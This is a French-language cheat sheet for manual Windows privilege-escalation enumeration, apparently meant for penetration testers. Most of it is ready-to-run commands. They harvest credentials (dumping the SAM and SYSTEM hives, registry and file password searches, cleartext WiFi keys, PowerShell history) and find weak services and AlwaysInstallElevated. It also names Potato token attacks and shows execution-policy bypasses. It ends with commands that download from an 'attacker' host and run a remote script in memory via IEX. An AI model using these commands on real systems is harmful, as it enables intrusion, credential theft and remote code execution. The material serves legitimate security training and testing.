# Énumération Windows pour escalade de privilèges

Guide d'énumération manuelle pour l'escalade de privilèges sous Windows.

---

## Informations système

```cmd
systeminfo
hostname
whoami /all
whoami /priv
whoami /groups
net user
net user %username%
net localgroup
net localgroup Administrators
```

---

## Privilèges intéressants pour privesc

| Privilège | Exploitation |
|-----------|--------------|
| SeImpersonatePrivilege | Attaques Potato |
| SeAssignPrimaryTokenPrivilege | Attaques Potato |
| SeBackupPrivilege | Lire n'importe quel fichier |
| SeRestorePrivilege | Écrire n'importe quel fichier |
| SeTakeOwnershipPrivilege | Devenir propriétaire de tout fichier |
| SeDebugPrivilege | Injection dans les processus |
| SeLoadDriverPrivilege | Charger des drivers kernel |

```cmd
whoami /priv
```

---

## Mots de passe et credentials

### Credentials sauvegardés

```cmd
cmdkey /list
```

### SAM & SYSTEM (nécessite admin ou backup priv)

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

### Fichiers d'installation sans surveillance

```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep\sysprep.inf
```

### Mots de passe dans le registre

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Mots de passe WiFi

```cmd
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```

### Historique PowerShell

```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Services

### Lister les services

```cmd
sc query
sc query state= all
wmic service get name,startname,pathname
```

```powershell
Get-Service
```

### Chemins de service non quotés

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

### Permissions faibles sur services

```cmd
sc qc <service_name>
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
```

---

## Tâches planifiées

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "Task To Run"
```

```powershell
Get-ScheduledTask
```

---

## Logiciels installés

```cmd
dir "C:\Program Files"
dir "C:\Program Files (x86)"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
wmic product get name,version
```

---

## Réseau

```cmd
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh firewall show config
netsh advfirewall show allprofiles
```

---

## Recherche de fichiers

### Recherche de mots de passe

```cmd
findstr /si password *.txt *.ini *.config *.xml
findstr /spin "password" *.*
```

### Recherche de fichiers spécifiques

```cmd
dir /s *pass* == *cred* == *vnc* == *.config*
where /r C:\ *.ini
where /r C:\ *password*
```

---

## AlwaysInstallElevated

Si les deux valeurs sont à 1, on peut installer un MSI en tant que SYSTEM.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## AutoRuns

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

### Dossiers de démarrage

```cmd
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

---

## DLL Hijacking

```cmd
# Vérifier le PATH
echo %PATH%

# Utiliser Process Monitor pour trouver les DLLs manquantes
# Puis placer une DLL malveillante dans un répertoire PATH modifiable
```

---

## Exploits kernel

```cmd
systeminfo
# Puis utiliser : windows-exploit-suggester.py --database <db> --systeminfo <file>
```

Ou utiliser Watson, Sherlock (PowerShell), ou winPEAS.

---

## Token impersonation

```cmd
whoami /priv
```

Si SeImpersonatePrivilege est activé :
- JuicyPotato
- PrintSpoofer
- RoguePotato
- GodPotato
- SweetPotato

---

## Commandes PowerShell utiles

### Bypass de politique d'exécution

```powershell
powershell -ep bypass
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass
```

### Téléchargement de fichiers

```powershell
Invoke-WebRequest -Uri "http://attacker/file" -OutFile "C:\temp\file"
(New-Object Net.WebClient).DownloadFile("http://attacker/file","C:\temp\file")
```

```cmd
certutil -urlcache -split -f "http://attacker/file" C:\temp\file
```

### Exécution en mémoire

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```
